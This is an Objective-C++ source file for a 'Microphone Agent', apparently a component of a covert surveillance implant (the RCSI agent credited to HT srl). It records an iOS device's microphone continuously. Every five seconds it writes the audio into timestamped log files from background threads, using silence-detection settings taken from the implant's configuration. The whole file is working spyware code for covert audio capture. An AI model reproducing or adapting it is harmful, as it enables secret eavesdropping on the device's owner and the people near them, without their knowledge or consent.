/*
 * RCSIAgentMicrophone.mm
 *  Microphone Agent - acts as a controller for the RCSIMicrophoneRecorder
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSIAgentMicrophone.h"

//#define DEBUG


static RCSIAgentMicrophone *sharedAgentMicrophone = nil;
static int gFileCounter   = 0;
static int gThreadCounter = 0;
static NSLock *recorderLock;

@implementation RCSIAgentMicrophone

@synthesize mAgentConfiguration;
@synthesize mRecorder;
@synthesize mIsRunning;
@synthesize mPlaybackWasInterrupted;

char *OSTypeToStr (char *buf, OSType t)
{
	char *p = buf;
	char str[4], *q = str;
	*(UInt32 *)str = CFSwapInt32 (t);
  
	for (int i = 0; i < 4; ++i)
    {
      if (isprint (*q) && *q != '\\')
        *p++ = *q++;
      else 
        {
          sprintf (p, "\\x%02x", *q++);
          p += 4;
        }
    }
  
	*p = '\0';
  
	return buf;
}

#pragma mark Log routines
- (void)generateLog
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [recorderLock lock];
  gThreadCounter += 1;
  [recorderLock unlock];
  
#ifdef DEBUG
  NSLog(@"Generating log for microphone");
#endif
  
  if (mRecorder->getLoTimestamp()     == 0
      && mRecorder->getHiTimestamp()  == 0)
    {
      time_t unixTime;
      time(&unixTime);
      int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      
      int32_t hiTimestamp = (int64_t)filetime >> 32;
      int32_t loTimestamp = (int64_t)filetime & 0xFFFFFFFF;
      
      mRecorder->setLoTimestamp(loTimestamp);
      mRecorder->setHiTimestamp(hiTimestamp);
    }
  
  [recorderLock lock];
  int fileCounter = gFileCounter;
  gFileCounter    += 1;
  [recorderLock unlock];
  
  mRecorder->createLogForBufferedAudio(fileCounter);
  
  [recorderLock lock];
  gThreadCounter  -= 1;
  [recorderLock unlock];
  
#ifdef DEBUG
  NSLog(@"Exiting thread: %d", fileCounter);
#endif
  
  [outerPool release];
}

#pragma mark Recorder routines
- (void)stopRecord
{
  mRecorder->StopRecord();
  
  // now create a new queue for the recorded file
  //mRecordFilePath = (CFStringRef)[NSTemporaryDirectory() stringByAppendingPathComponent: @"micRecording.wav"];
}

- (void)startRecord
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (mRecorder->IsRunning() == FALSE)
    {
#ifdef DEBUG
      NSLog(@"Starting recorder");
#endif
      
      // Start the recorder
      mRecorder->StartRecord();
#ifdef DEBUG
      NSLog(@"Recorder Started");
#endif
    }
  
  [pool release];
}

#pragma mark AudioSession listeners
void interruptionListener2(	void *	inClientData,
                           UInt32	inInterruptionState)
{
	RCSIAgentMicrophone *THIS = (RCSIAgentMicrophone *)inClientData;
	if (inInterruptionState == kAudioSessionBeginInterruption)
    {
      if (THIS->mRecorder->IsRunning()) {
        [THIS stopRecord];
      }
    }
}

void propListener2 (void                    *inClientData,
                    AudioSessionPropertyID  inID,
                    UInt32                  inDataSize,
                    const void              *inData)
{
	RCSIAgentMicrophone *THIS = (RCSIAgentMicrophone *)inClientData;

	if (inID == kAudioSessionProperty_AudioRouteChange)
    {
      CFDictionaryRef routeDictionary = (CFDictionaryRef)inData;			
      //CFShow(routeDictionary);
      
      CFNumberRef reason = (CFNumberRef)CFDictionaryGetValue(routeDictionary, CFSTR(kAudioSession_AudioRouteChangeKey_Reason));
      SInt32 reasonVal;
      CFNumberGetValue(reason, kCFNumberSInt32Type, &reasonVal);
      
      if (reasonVal != kAudioSessionRouteChangeReason_CategoryChange)
        {
          /*CFStringRef oldRoute = (CFStringRef)CFDictionaryGetValue(routeDictionary, CFSTR(kAudioSession_AudioRouteChangeKey_OldRoute));
           if (oldRoute)	
           {
           printf("old route:\n");
           CFShow(oldRoute);
           }
           else 
           printf("ERROR GETTING OLD AUDIO ROUTE!\n");
           
           CFStringRef newRoute;
           UInt32 size; size = sizeof(CFStringRef);
           OSStatus error = AudioSessionGetProperty(kAudioSessionProperty_AudioRoute, &size, &newRoute);
           if (error) printf("ERROR GETTING NEW AUDIO ROUTE! %d\n", error);
           else
           {
           printf("new route:\n");
           CFShow(newRoute);
           }*/
          
          // stop the queue if we had a non-policy route change
          if (THIS->mRecorder->IsRunning())
            {
              [THIS stopRecord];
            }
        }	
    }
}

- (void)setupAudioQueue
{
  // Allocate our singleton instance for the recorder & player object
  mRecorder = new RCSIMicrophoneRecorder();
  
  OSStatus error = AudioSessionInitialize(NULL, NULL, interruptionListener2, self);
  
  if (error)
    {
#ifdef DEBUG
      printf("ERROR INITIALIZING AUDIO SESSION! %d\n", error);
#endif
    }
  else 
    {
      UInt32 category = kAudioSessionCategory_PlayAndRecord;	
      error = AudioSessionSetProperty(kAudioSessionProperty_AudioCategory, sizeof(category), &category);
#ifdef DEBUG
      if (error)
        printf("couldn't set audio category!");
#endif
      error = AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, propListener2, self);
#ifdef DEBUG
      if (error)
        printf("ERROR ADDING AUDIO SESSION PROP LISTENER! %d\n", error);
#endif
      UInt32 inputAvailable = 0;
      UInt32 size = sizeof(inputAvailable);
      
      // we do not want to allow recording if input is not available
      error = AudioSessionGetProperty(kAudioSessionProperty_AudioInputAvailable, &size, &inputAvailable);
#ifdef DEBUG
      if (error)
        printf("ERROR GETTING INPUT AVAILABILITY! %d\n", error);
#endif
      
      // we also need to listen to see if input availability changes
      error = AudioSessionAddPropertyListener(kAudioSessionProperty_AudioInputAvailable, propListener2, self);
#ifdef DEBUG
      if (error)
        printf("ERROR ADDING AUDIO SESSION PROP LISTENER! %d\n", error);
#endif
      error = AudioSessionSetActive(true); 
#ifdef DEBUG
      if (error)
        printf("AudioSessionSetActive (true) failed");
#endif
    }
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(playbackQueueStopped:)
                                               name: @"playbackQueueStopped"
                                             object: nil];
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(playbackQueueResumed:)
                                               name: @"playbackQueueResumed"
                                             object:nil];
}

# pragma mark Notification routines
- (void)playbackQueueStopped:(NSNotification *)note
{
#ifdef DEBUG
  NSLog(@"Playback queue stopped");
#endif
}

- (void)playbackQueueResumed:(NSNotification *)note
{
#ifdef DEBUG
  NSLog(@"Playback queue resumed");
#endif
}

#pragma mark Cleanup
- (void)dealloc
{
	delete mRecorder;
	
	[super dealloc];
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  int fileCounter;
  
  [recorderLock lock];
  int runningThreads = gThreadCounter;
  [recorderLock unlock];
  
  while (runningThreads > 0)
    {
      usleep(10000);
    }
  
#ifdef DEBUG
  NSLog(@"Agent Microphone started");
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  NSDate *micStartedDate = [NSDate date];
  NSTimeInterval interval = 0;
  
  //
  // Setup audioQueue once for all
  //
  [self setupAudioQueue];
  
  //
  // Grab config parameters
  //
  microphoneAgentStruct *microphoneRawData;
  microphoneRawData = (microphoneAgentStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
  
  //
  // Set config parameters
  //
  mRecorder->setVAD(microphoneRawData->detectSilence);
  mRecorder->setSilenceThreshold(microphoneRawData->silenceThreshold);
  
  while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
         && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      [self startRecord];
      interval = [[NSDate date] timeIntervalSinceDate: micStartedDate];
      
      if (fabs(interval) >= 5)
        {
          //[self stopRecord];
          
          [recorderLock lock];
          runningThreads = gThreadCounter;
          fileCounter    = gFileCounter;
          [recorderLock unlock];
          
#ifdef DEBUG
          NSLog(@"threads running: %d", runningThreads);
#endif
          
          if (runningThreads >= 15)
            {
#ifdef DEBUG
              NSLog(@"ANOMALY DETECTED - More than 15 threads running");
#endif
              [self stopRecord];
              while (gThreadCounter > 5)
                {
                  usleep(10000);
                }
                
#ifdef DEBUG
              NSLog(@"Threads counter < 5 - starting back recording");
#endif
            }
            
          [NSThread detachNewThreadSelector: @selector(generateLog)
                                   toTarget: self
                                 withObject: nil];
          
#ifdef DEBUG
          NSLog(@"fileCounter: %d", fileCounter);
#endif

          micStartedDate = [[NSDate date] retain];
        }
        
      [innerPool drain];
      usleep(5000);
    }

#ifdef DEBUG
  NSLog(@"Exiting microphone");
#endif
  
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
    {      
      mIsRunning = FALSE;
      [mAgentConfiguration setObject: AGENT_STOPPED
                              forKey: @"status"];
      
      mRecorder->setLoTimestamp(0);
      mRecorder->setHiTimestamp(0);
      
      if (mRecorder->IsRunning())
        {
          [self stopRecord];
        }
    }
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while (1)
    {
      [recorderLock lock];
      int runningThreads = gThreadCounter;
      [recorderLock unlock];
      
      if (runningThreads == 0)
        {
          break; 
        }
      else
        {
          usleep(10000);
        }
    }
  
  [recorderLock lock];
  gFileCounter = 0;
  
  [recorderLock unlock];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
         internalCounter <= MAX_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
#ifdef DEBUG
  NSLog(@"Agent Microphone stopped");
#endif
  
  return YES;
}

- (BOOL)resume
{
  return TRUE;
}

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentMicrophone *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentMicrophone == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentMicrophone;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentMicrophone== nil)
      {
        sharedAgentMicrophone = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentMicrophone;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentMicrophone != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedAgentMicrophone = self;
            
            recorderLock = [[NSLock alloc] init];
          }
        
      }
  }
  
  return sharedAgentMicrophone;
}

@end
